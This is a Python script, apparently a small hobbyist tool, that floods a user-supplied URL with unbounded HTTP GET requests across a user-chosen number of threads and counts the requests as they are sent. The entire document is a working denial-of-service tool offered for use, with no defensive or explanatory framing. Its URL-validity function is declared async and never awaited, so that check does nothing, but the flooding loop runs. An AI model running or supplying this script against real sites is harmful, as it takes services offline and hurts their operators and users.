"""
Made by igna#0911 | https://github.com/uhIgnacio
"""
import requests, threading, os
from colorama import Fore, init

# Main
init(convert=True)
os.system("cls")
counter = 0

# Input
url = input(Fore.LIGHTMAGENTA_EX + "[x] Enter URL: ")
amount = input(Fore.LIGHTMAGENTA_EX + "[x] Enter Threads Amount: ")

# Check URL is valid
async def check():
    try:
        r = requests.get(url)
        if r.status_code == 200 or r.status_code == 301 or r.status_code == 302:
            print(Fore.LIGHTGREEN_EX + "[+] URL is valid")
            print(Fore.LIGHTGREEN_EX + f"Starting to flood with {amount} threads...")
        else:
            print(Fore.LIGHTRED_EX + "[-] URL is invalid")
            exit()
    except Exception as e:
            print(Fore.LIGHTRED_EX + f"[-] Error | {e}")

# Start Flooding
def Flood():
    global counter
    check()
    while True:
        try:
            requests.get(url)
            counter += 1
            print(Fore.LIGHTGREEN_EX + f"[+] {counter} requests sent!...")
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"[-] Error | {e}!")
            exit()


# Start Threads
for _ in range(int(amount)):
    t = threading.Thread(target=Flood)
    t.start()
